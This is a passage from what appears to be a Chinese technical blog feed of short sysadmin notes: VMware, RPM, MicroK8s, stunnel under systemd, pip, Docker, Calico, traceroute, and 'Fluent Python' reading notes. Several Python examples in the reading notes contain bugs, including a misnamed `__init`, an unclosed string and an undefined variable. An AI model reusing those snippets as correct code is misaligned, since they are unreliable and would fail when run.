<li>再重启vpxa服务，如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/vpxa stop ; /etc/init.d/hostd restart</span><br><span class="line"></span><br><span class="line">删掉 /etc/vmware/vpxa/vpxa.cfg 文件中 &lt;vpxa/&gt; 的内容</span><br><span class="line"></span><br><span class="line">/etc/init.d/vpxa start</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<h2><span id="参考">参考</span></h2><p><a href="https://www.uccollabing.com/esxi-access-to-resource-settings-on-the-host-is-restricted-to-the-server-that-is-managing-it/">https://www.uccollabing.com/esxi-access-to-resource-settings-on-the-host-is-restricted-to-the-server-that-is-managing-it/</a></p>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
    <url>/2023/0301211739.html</url>
    <content><![CDATA[<p>Add following line to spec file</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
]]></content>
      <categories>
        <category>RPM</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>如何查看Microk8s的apiserver证书过期时间</title>
    <url>/2023/0330211939.html</url>
    <content><![CDATA[<p>使用以下命令检查当前 MicroK8s 控制平面运行状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s status</span><br></pre></td></tr></table></figure>
<p>确认 MicroK8s 控制平面运行正常后，使用以下命令获取 Kubernetes 集群的配置信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s config view</span><br></pre></td></tr></table></figure>
<p>找到以下行，其中包含 API Server 的证书:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certificate-authority-data: ***</span><br><span class="line">certificate-authority-data 给出了证书的 Base64 编码数据。</span><br></pre></td></tr></table></figure>
<p>在终端中解码证书数据并输出详细信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -in &lt;(echo &quot;&lt;cert-data&gt;&quot;) -text -noout | grep &quot;Not After&quot;</span><br></pre></td></tr></table></figure>
<p>将 <cert-data> 替换为第三步输出的证书编码数据，该命令将解码证书并输出其详细信息，包括过期时间, 在输出信息中找到 “Not After” 字段，它包含证书的过期日期。</cert-data></p>
<p>microk8s证书默认路径：&#x2F;var&#x2F;snap&#x2F;microk8s&#x2F;current&#x2F;certs&#x2F;</p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>使用systemd启动stunnel，并设置自动重启的方法</title>
    <url>/2023/0426212521.html</url>
    <content><![CDATA[<h2><span id="操作步骤">操作步骤</span></h2><p>运行环境: Centos7</p>
<ol>
<li><p>安装stunnel </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install stunnel</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写systemd配置文件，放到<code>/usr/lib/systemd/system</code></p>
</li>
</ol>
<span id="more"></span>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Stunnel Proxy Server</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/stunnel /etc/stunnel/stunnel.conf</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li>Restart&#x3D;always 只要不是通过<code>systemctl stop</code>来停止服务，任何情况下都必须要重启服务，默认值为no</li>
</ul>
<ol start="3">
<li>启动stunnel<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start stunnel</span><br></pre></td></tr></table></figure></li>
</ol>
<h2><span id="手动启动和停止stunnel的方法">手动启动和停止stunnel的方法</span></h2><p>启动stunnel</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stunnel /etc/stunnel/stunnel.conf</span><br></pre></td></tr></table></figure>
<p>停止stunnel</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> `<span class="built_in">cat</span> /var/run/stunnel.pid`</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-starting_stopping_restarting_stunnel">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;6&#x2F;html&#x2F;security_guide&#x2F;sect-starting_stopping_restarting_stunnel</a></p>
]]></content>
      <categories>
        <category>systemd</category>
      </categories>
      <tags>
        <tag>systemd</tag>
      </tags>
  </entry>
  <entry>
    <title>crontab执行失败返回127的原因和解决方法</title>
    <url>/2023/0508212643.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>用<code>crontab</code>执行自己编写的Shell脚本报错，<code>iptables</code>命令返回127(command not found) ，在后台手动执行脚本是正常的。</p>
<h2><span id="解决方法">解决方法</span></h2><p>添加PATH，在脚本里添加如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/sbin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2><span id="参考资料">参考资料</span></h2><p><a href="https://blog.csdn.net/qq_36588424/article/details/127549734">https://blog.csdn.net/qq_36588424&#x2F;article&#x2F;details&#x2F;127549734</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>pip3只下载不安装以及离线安装的方法</title>
    <url>/2023/0508213050.html</url>
    <content><![CDATA[<h3><span id="只下载不安装">只下载不安装</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<p>如不需要下载依赖包，改用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes --no-deps on -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3><span id="离线安装">离线安装</span></h3><ol start="0">
<li>新增requirements.txt，内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psutil</span><br><span class="line">supervisor</span><br><span class="line">kubernetes</span><br></pre></td></tr></table></figure></li>
<li>下载安装包到本地<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download -d $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
<li>离线安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install --no-index --find-links $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RockyLinux9 docker中安装python2方法</title>
    <url>/2023/0508213215.html</url>
    <content><![CDATA[<p>新增Dockerfile, 内容如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.1</span><br><span class="line"></span><br><span class="line">RUN yum -y install gcc zlib openssl openssl-devel zlib-devel wget</span><br><span class="line"></span><br><span class="line">RUN mkdir /py2 &amp;&amp; mkdir /usr/local/python2.7</span><br><span class="line"></span><br><span class="line">RUN wget -O /py2/Python-2.7.14.tgz https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz \</span><br><span class="line">    &amp;&amp; tar -xzf /py2/Python-2.7.14.tgz -C /py2/</span><br><span class="line"></span><br><span class="line">RUN cd /py2/Python-2.7.14 &amp;&amp; ./configure --prefix=/usr/local/python2.7/ --enable-shared \</span><br><span class="line">    &amp;&amp; sed -i &#x27;219,221 s/^.//&#x27; /py2/Python-2.7.14/Modules/Setup \</span><br><span class="line">    &amp;&amp; make -j4 &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">RUN echo &quot;/lib&quot; &gt;&gt; /etc/ld.so.conf &amp;&amp; ldconfig \</span><br><span class="line">    &amp;&amp; ln -s /usr/local/python2.7/lib/libpython2.7.so.1.0 /lib/libpython2.7.so.1.0 \</span><br><span class="line">    &amp;&amp; ln -s /usr/local/python2.7/bin/python /usr/bin/python \</span><br><span class="line">    &amp;&amp; rm -rf /py2</span><br></pre></td></tr></table></figure>
<p>使用docker build命令构建镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t [image_repo:image_tag] -f Dockerfile .</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://www.jianshu.com/p/bcfaa5ff1cfc">https://www.jianshu.com/p/bcfaa5ff1cfc</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s calico-kube-controller not running, Failed to initialize Calico datastore error... 解决方法</title>
    <url>/2023/0508212859.html</url>
    <content><![CDATA[<h2><span id="运行环境">运行环境</span></h2><p>Rocky Linux 9</p>
<h2><span id="问题描述">问题描述</span></h2><p>microk8s calico-kube-controller pod运行失败， 报错：<code>Failed to initialize Calico datastore error=Get “https://10.152.183.1:443/apis/crd.projectcalico.org/v1/clusterinformations/default”: context deadline exceeded</code></p>
<span id="more"></span>
<h2><span id="原因分析">原因分析</span></h2><ul>
<li>Rocky Linux 9 iptables版本是1.8，基于nft而不是legacy。而calico插件默认使用legacy版本，导致<code>cali-INPUT</code>链没有生成</li>
<li>如果用户在INPUT链自定义了DROP&#x2F;REJECT规则, 同时<code>cali-INPUT</code>链没有生成，可能会导致k8s内部流量被丢弃，出现calico-kube-controller通过http连接apiserver超时报错.</li>
</ul>
<h2><span id="解决方法">解决方法</span></h2><p>在calico-node中添加环境变量<code>FELIX_IPTABLESBACKEND</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env:</span><br><span class="line"> - name: FELIX_IPTABLESBACKEND</span><br><span class="line">   value: NFT</span><br></pre></td></tr></table></figure>

<p>具体操作如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s kubectl delete -f /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br><span class="line">microk8s stop</span><br><span class="line">microk8s start</span><br><span class="line"></span><br><span class="line">Edit /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br><span class="line"><span class="built_in">env</span>:</span><br><span class="line"> - name: FELIX_IPTABLESBACKEND</span><br><span class="line">   value: NFT</span><br><span class="line">microk8s kubectl apply -f /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br></pre></td></tr></table></figure>
<h2><span id="参考资料">参考资料</span></h2><p><a href="https://microk8s.io/docs/change-cidr">https://microk8s.io/docs/change-cidr</a><br><a href="https://zhuanlan.zhihu.com/p/590101932">https://zhuanlan.zhihu.com/p/590101932</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>如何设置systemd服务自动重启</title>
    <url>/2023/0509213506.html</url>
    <content><![CDATA[<h2><span id="设置systemd服务自动重启的方法">设置systemd服务自动重启的方法</span></h2><p>service文件里添加如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Restart=always</span><br><span class="line">RestartSec=30</span><br><span class="line">StartLimitInterval=0</span><br></pre></td></tr></table></figure>
<ul>
<li>Restart&#x3D;always: 只要不是通过systemctl stop来停止服务，任何情况下都必须要重启服务，默认值为no</li>
<li>RestartSec&#x3D;30: 重启间隔，比如某次异常后，等待30(s)再进行启动，默认值0.1(s)</li>
<li>StartLimitInterval&#x3D;0: 无限次重启，默认是10秒内如果重启超过5次则不再重启，设置为0表示不限次数重启</li>
</ul>
<span id="more"></span>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://www.freedesktop.org/software/systemd/man/systemd.service.html">https://www.freedesktop.org/software/systemd/man/systemd.service.html</a><br>【2】<a href="https://blog.csdn.net/easylife206/article/details/101730416">https://blog.csdn.net/easylife206/article/details/101730416</a></p>
]]></content>
      <categories>
        <category>systemd</category>
      </categories>
      <tags>
        <tag>systemd</tag>
      </tags>
  </entry>
  <entry>
    <title>在Docker中使用GDB调试的方法</title>
    <url>/2023/0509214229.html</url>
    <content><![CDATA[<h2><span id="docker中使用gdb调试的方法">Docker中使用GDB调试的方法</span></h2><ol>
<li>首先在docker中安装<code>gdb</code>， 以centos为例，可以用<code>yum install gdb</code>安装</li>
<li>启动docker容器命令时，需要添加<code>--privileged</code>, <code>--cap-add=SYS_PTRACE</code>, <code>--security-opt seccomp=unconfined</code>参数， 如下<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -d -it  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined [your_container_id]  bash</span><br></pre></td></tr></table></figure>
<span id="more"></span>
添加这些参数的原因参考： <a href="https://developer.aliyun.com/article/674757">为什么在Docker里使用gdb调试器会报错</a></li>
</ol>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM中的config和config(noreplace)</title>
    <url>/2023/0509213628.html</url>
    <content><![CDATA[<p>参考：<a href="https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html">https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Traceroute简介和抓包</title>
    <url>/2023/0515214351.html</url>
    <content><![CDATA[<h2><span id="traceroute原理">traceroute原理</span></h2><p>Traceroute 是一种网络诊断工具，用于确定数据包从一个源到达目的地所经过的路径。它通过发送一系列的数据包，并观察每个数据包经过的路由器（或称为跃点）来实现这一目的。</p>
<span id="more"></span>

<p><strong>工作原理：</strong></p>
<ul>
<li>Traceroute 发送一系列的 UDP 数据包，每个数据包都具有不同的 TTL（Time to Live）值。TTL 值表示数据包在网络中可经过的最大跃点数。</li>
<li>当第一个数据包离开源设备时，它的 TTL 值被设置为 1。当该数据包到达网络中的第一个路由器时，路由器会将 TTL 值减 1，并转发该数据包。如果 TTL 值减为 0，路由器将丢弃该数据包并向源设备发送 ICMP 时间超时报文。</li>
<li>源设备收到 ICMP 时间超时报文后，就知道了到达第一个路由器的路径。然后，源设备增加 TTL 值并发送第二个数据包，以便确定下一个路由器。</li>
<li>这个过程不断重复，每次 TTL 值增加，直到数据包到达目的地。目的设备将收到数据包并向源设备发送 ICMP 端口不可达报文，从而终止 Traceroute 进程。</li>
<li>Traceroute 将记录每个数据包的路径，包括每个跃点的 IP 地址和响应时间。最终将呈现给用户一张路由跟踪表，显示了数据包从源到目的地经过的所有路由器。</li>
</ul>
<p>总的来说，Traceroute 通过探测数据包的路径和响应时间，帮助网络管理员诊断网络连接问题，定位潜在的瓶颈或故障点。</p>
<h2><span id="traceroute用法">traceroute用法</span></h2><p>Linux系统下，traceroute用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">traceroute hostname</span><br></pre></td></tr></table></figure>
<p>Windows系统使用tracert命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tracert hostname</span><br></pre></td></tr></table></figure>
<h2><span id="traceroute抓包">traceroute抓包</span></h2><p>在宿主机10.206.216.95上执行<code>traceroute www.baidu.com</code>，通过<code>tcpdump</code>抓包，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ifconfig ens192</span><br><span class="line">ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.206.216.95  netmask 255.255.255.0  broadcast 10.206.216.255</span><br><span class="line">route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         gateway         0.0.0.0         UG    100    0        0 ens192</span><br><span class="line">10.206.216.0    0.0.0.0         255.255.255.0   U     100    0        0 ens192</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmux pane 1</span></span><br><span class="line">$ tcpdump -i ens192 icmp and host 10.206.216.95 -w traceroute.pcap</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmux pane 2</span></span><br><span class="line">$ traceroute  www.baidu.com</span><br><span class="line">traceroute to www.baidu.com (36.155.132.55), 30 hops max, 60 byte packets</span><br><span class="line"> 1  gateway (10.206.216.254)  0.239 ms  0.152 ms  0.147 ms</span><br><span class="line"> 2  10.206.2.254 (10.206.2.254)  0.265 ms  0.274 ms  0.241 ms</span><br><span class="line"> 3  192.168.200.1 (192.168.200.1)  0.545 ms  0.506 ms  0.825 ms</span><br><span class="line"> 4  36.152.113.193 (36.152.113.193)  2.837 ms  3.182 ms  3.552 ms</span><br><span class="line"> 5  221.178.162.185 (221.178.162.185)  2.632 ms * *</span><br><span class="line"> 6  * * 183.207.54.161 (183.207.54.161)  3.116 ms</span><br><span class="line"> 7  183.207.67.106 (183.207.67.106)  3.576 ms 183.207.22.130 (183.207.22.130)  3.195 ms 183.207.66.102 (183.207.66.102)  3.638 ms</span><br><span class="line"> 8  * 36.155.156.46 (36.155.156.46)  3.884 ms 36.155.156.54 (36.155.156.54)  4.690 ms</span><br><span class="line"> 9  36.155.157.174 (36.155.157.174)  4.197 ms 36.155.157.170 (36.155.157.170)  4.344 ms  3.964 ms</span><br><span class="line">10  * * *</span><br><span class="line">11  * * *</span><br><span class="line">12  * * *</span><br><span class="line">13  * * *</span><br><span class="line">14  * * *</span><br><span class="line">15  * * *</span><br><span class="line">16  * * *</span><br><span class="line">17  * * *</span><br><span class="line">18  * * *</span><br><span class="line">19  * * *</span><br><span class="line">20  * * *</span><br><span class="line">21  * * *</span><br><span class="line">22  * * *</span><br><span class="line">23  * * *</span><br><span class="line">24  * * *</span><br><span class="line">25  * * *</span><br><span class="line">26  * * *</span><br><span class="line">27  * * *</span><br><span class="line">28  * * *</span><br><span class="line">29  * * *</span><br><span class="line">30  * * *</span><br></pre></td></tr></table></figure>
<p>wireshark分析结果：<br><img data-src="/2023/0515214351/image1.png"></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Traceroute</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows上通过git bash执行python卡住的解决方法</title>
    <url>/2023/0626214641.html</url>
    <content><![CDATA[<h2><span id="解决方法">解决方法</span></h2><p>编辑 <code>C:\Program Files\Git\etc\profile.d\aliases.sh</code>，将<code>python2.7</code>改成<code>python</code><br><img data-src="/2023/0626214641/image1.png"><br>编辑完成后，重启git bash, 输入python即可</p>
<span id="more"></span>

<h2><span id="参考">参考</span></h2><p><a href="https://blog.csdn.net/ofreelander/article/details/112058975">https://blog.csdn.net/ofreelander/article/details/112058975</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Win</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>pip基础用法示例</title>
    <url>/2023/0525214525.html</url>
    <content><![CDATA[<h2><span id="配置国内源">配置国内源</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host = https://pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>

<h2><span id="安装包">安装包</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install XXX              # 最新版本</span><br><span class="line">pip install XXX==1.0.4       # 指定版本</span><br><span class="line">pip install XXX&gt;=1.0.4       # 最低版本</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="卸载包">卸载包</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip uninstall XXX</span><br></pre></td></tr></table></figure>

<h2><span id="查看某个已安装包的信息">查看某个已安装包的信息</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip show XXX    # 查看信息</span><br><span class="line">pip show -f XXX # 查看详细信息</span><br></pre></td></tr></table></figure>

<h2><span id="列出所有已安装的包">列出所有已安装的包</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip list</span><br></pre></td></tr></table></figure>

<h2><span id="查看本地某个wheel包的依赖">查看本地某个wheel包的依赖</span></h2><p>例：使用pkginfo命令查看kubernetes-26.1.0-py2.py3-none-any.whl的依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pkginfo</span><br><span class="line">/usr/local/python3/bin/pkginfo kubernetes-26.1.0-py2.py3-none-any.whl</span><br><span class="line"></span><br><span class="line">metadata_version: 2.1</span><br><span class="line">name: kubernetes</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">requires_python: &gt;=3.6</span><br><span class="line">requires_dist: [&#x27;certifi (&gt;=14.05.14)&#x27;, &#x27;six (&gt;=1.9.0)&#x27;, &#x27;python-dateutil (&gt;=2.5.3)&#x27;, &#x27;setuptools (&gt;=21.0.0)&#x27;, &#x27;pyyaml (&gt;=5.4.1)&#x27;, &#x27;google-auth (&gt;=1.0.1)&#x27;, &#x27;websocket-client (!=0.40.0,!=0.41.*,!=0.42.*,&gt;=0.32.0)&#x27;, &#x27;requests&#x27;, &#x27;requests-oauthlib&#x27;, &#x27;urllib3 (&gt;=1.24.2)&#x27;, &#x27;ipaddress (&gt;=1.0.17) ; python_version==&quot;2.7&quot;&#x27;, &quot;adal (&gt;=1.0.2) ; extra == &#x27;adal&#x27;&quot;]</span><br><span class="line">provides_extras: [&#x27;adal&#x27;]</span><br></pre></td></tr></table></figure>

<h2><span id="只下载某个包到本地不安装">只下载某个包到本地，不安装</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<p>如果不想下载这个包的依赖，使用–no-deps选项，用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes --no-deps on -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="离线安装通过requirementstxt指定要安装的包">离线安装，通过requirements.txt指定要安装的包</span></h2><ol start="0">
<li>新增requirements.txt，内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psutil</span><br><span class="line">supervisor</span><br><span class="line">kubernetes</span><br></pre></td></tr></table></figure></li>
<li>下载安装包到本地<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download -d $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
<li>离线安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install --no-index --find-links $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>流畅的Python 笔记</title>
    <url>/2023/0719214818.html</url>
    <content><![CDATA[<h2><span id="第一章python数据类型">第一章：Python数据类型</span></h2><h3><span id="x20为什么需要特殊方法">&#x20;为什么需要特殊方法</span></h3><span id="more"></span>

<p>在类中定义特殊方法的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyObj</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.L)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">self</span>.L[index]</span><br><span class="line"></span><br><span class="line">o = MyObj()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len: &#x27;</span>, <span class="built_in">len</span>(o))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;L[1]: , o[1])</span></span><br></pre></td></tr></table></figure>

<p>特殊方法存在是为了被Python解释器调用的，自己并不需要调用，比如说不应使用my<em>obj.__len__()，而应该使用len(myobj)</em></p>
<h3><span id="随机返回某个元素">随机返回某个元素</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line">choice(o)   <span class="comment"># o = MyObj()</span></span><br></pre></td></tr></table></figure>

<h3><span id="使用特殊方法实现一个vector类">使用特殊方法实现一个Vector类</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> hypot</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__abs__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> hypot(<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bool__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(<span class="built_in">abs</span>(<span class="variable language_">self</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Vector(%r, %r)&quot;</span> % (<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.x + other.x</span><br><span class="line">        y = <span class="variable language_">self</span>.y + other.y</span><br><span class="line">        <span class="keyword">return</span> Vector(x, y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, scalar</span>):</span><br><span class="line">        <span class="keyword">return</span> Vector(<span class="variable language_">self</span>.x * scalar, <span class="variable language_">self</span>.y * scalar)</span><br></pre></td></tr></table></figure>

<ul>
<li>Python有一个内置的函数叫repr，它能把一个对象用字符串形式表达式以便辨认</li>
<li>通过add和mul函数，支持+和*运算</li>
<li>默认情况，自定义类实例总为真，除非这个类对bool有自己的实现</li>
</ul>
<h3><span id="特殊方法一览">特殊方法一览</span></h3><p><a href="https://docs.python.org/3/reference/datamodel.html">3. Data model — Python 3.11.4 documentation</a></p>
<h3><span id="x20为什么len不是普通方法">&#x20;为什么len不是普通方法</span></h3><p>为了让Python自带的数据结构可以走后门，abs也是同理，但多亏了它是特殊方法，可以把len用于自定义数据类型</p>
<h3><span id="x20本章小结">&#x20;本章小结</span></h3><ul>
<li>通过特殊方法，自定义数据类型可以表现得跟内置类型一样，从而写出更具表达力的代码</li>
<li>Python对象的基本要求就是它得有合理的字符串表示形式，可以通过repr和str满足这个要求，前者方便调试日志，后者给终端用户看(print)</li>
</ul>
<h2><span id="第二章序列构成的数组">第二章：序列构成的数组</span></h2><h3><span id="学会使用列表推导增强代码可读性">学会使用列表推导，增强代码可读性</span></h3><p>例：把一个字符串变成Unicode代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">symbols = <span class="string">&#x27;abcdefg&#x27;</span></span><br><span class="line">codes = [ <span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> symbols <span class="keyword">if</span> <span class="built_in">ord</span>(s) &gt; <span class="number">100</span>]</span><br><span class="line"><span class="built_in">print</span>(codes)</span><br><span class="line">[<span class="number">101</span>,<span class="number">102</span>,<span class="number">103</span>]</span><br></pre></td></tr></table></figure>

<p>例：笛卡尔积</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">colors = [<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;white&#x27;</span>]</span><br><span class="line">sizes = [<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;L&#x27;</span>]</span><br><span class="line">tshirts = [(color,size) <span class="keyword">for</span> color <span class="keyword">in</span> colors <span class="keyword">for</span> size <span class="keyword">in</span> sizes ]</span><br><span class="line"><span class="built_in">print</span>(tshirts)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[(<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;S&#x27;</span>), (<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;M&#x27;</span>), (<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;L&#x27;</span>), (<span class="string">&#x27;whi</span></span><br><span class="line"><span 